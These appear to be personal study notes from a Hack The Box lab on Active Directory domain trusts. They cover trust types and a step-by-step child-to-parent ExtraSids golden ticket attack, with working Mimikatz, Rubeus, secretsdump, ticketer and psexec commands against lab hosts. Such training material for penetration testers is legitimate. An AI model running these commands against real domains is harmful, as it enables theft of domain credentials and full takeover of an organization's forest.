--- ---

Context:
Many large organizations will acquire new companies over time and bring them into the fold. One way this is done for ease of use is to establish a trust relationship with the new domain. In doing so, you can avoid migrating all the established objects, making integration much quicker. This trust can also introduce weaknesses into the customer's environment if they are not careful. A subdomain with an exploitable flaw or vulnerability can provide us with a quick route into the target domain. Companies may also establish trusts with other companies (such as an MSP), a customer, or other business units of the same company (such as a division of the company in another geographical region).

What Are Domain Trusts?
A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication.

Types of Trust:
	• Parent-child: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.
	ㅤ
	• Cross-link: A trust between child domains to speed up authentication.
	ㅤ
	• External: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.
	ㅤ
	• Tree-root: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
	ㅤ
	• Forest: A transitive trust between two forest root domains.
	ㅤ
	• ESAE: A bastion forest used to manage Active Directory. 

Transitive v non-transitive:
	• A transitive trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.
	ㅤ
	• In a non-transitive trust, the child domain itself is the only one trusted.

![[Pasted image 20230104194405.png]]

Enumerating Trust Relationships w/ Powershell
```
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *
```

Enumerating Trust Relationships w/ PowerView
```
PS C:\htb> Get-DomainTrustMapping
```

Checking Users in Child Domain using Get-DomainUser
```
PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

Enumerating Trusts with Bloodhound:
![[Pasted image 20230104194527.png]]

---

<h2>Attacking Domain Trusts - [Child -> Parent Trusts] from Windows</h2>

SID History Primer
The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.



ExtraSids Attack - Mimikatz
This attack allows for the compromise of a parent domain once the child domain has been compromised.

Requirements after compromising child domain:
	• The KRBTGT hash for the child domain
	• The SID for the child domain
	• The name of a target user in the child domain (does not need to exist!)
	• The FQDN of the child domain.
	• The SID of the Enterprise Admins group of the root domain.
	• With this data collected, the attack can be performed with Mimikatz.

Steps:

1. Obtain the KRBTGT Account's NT Hash with Mimikatz
![[Pasted image 20230104194734.png]]

2. Use Get-DomainSID via PowerView to get the SID
![[Pasted image 20230104194755.png]]

3. Obtain Enterprise Admin Group's SID using Get-DomainGroup
```
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

4. Using ls to Confirm No Access (Before Attack)
![[Pasted image 20230104194833.png]]

5. Using the data above, create a golden ticket with Mimikatz
```
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

6. Confirm the ticket is in memory using klist
![[Pasted image 20230104194924.png]]

7. List the Entire C: Drive of the Domain Controller
![[Pasted image 20230104194954.png]]



ExtraSids Attack - Rubeus
We will formulate our Rubeus command using the data we retrieved above. The /rc4 flag is the NT hash for the KRBTGT account. The /sids flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.

1. Create the golden ticket with Rubeus
```
PS C:\htb> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f
/domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

2. Confirm the ticket is in memory with klist
![[Pasted image 20230104195113.png]]

3. Perform a DCSync Attack against the Domain Admin user (lab_adm)
![[Pasted image 20230104195132.png]]

---

<h2>Attacking Domain Trust - [Child -> Parent] Trusts from Linux</h2>

Need to gather the following information:
	• The KRBTGT hash for the child domain
	• The SID for the child domain
	• The name of a target user in the child domain (does not need to exist!)
	• The FQDN of the child domain
	• The SID of the Enterprise Admins group of the root domain

Once we have complete control of the child domain, LOGISTICS.INLANEFREIGHT.LOCAL, we can use secretsdump.py to DCSync and grab the NTLM hash for the KRBTGT account.

Steps:
1. Perform DCSync with secretsdump.py 
```
TeneBrae93@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just- dc-user LOGISTICS/krbtgt
```

2. Perform SID Brute Forcing using lookupsid.py
```
TeneBrae93@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-
student_adm@172.16.5.240 | grep "Domain SID"
```

3. Grab the Domain SID & Attaching to Enterprise Admin's RID
```
TeneBrae93@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

4. Construct a Golden Ticket using ticketer.py
```
TeneBrae93@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain
LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
- The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials. Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.

5. Set the KRB5CCNAME Environmental Variable
```
TeneBrae93@htb[/htb]$ export
KRB5CCNAME=hacker.ccache
```

6. Get a SYSTEM Shell Using Impacket's psexec.py
```
TeneBrae93@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```



Automating the Attack with raiseChild.py
```
TeneBrae93@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5
LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
- Though tools such as raiseChild.py can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool.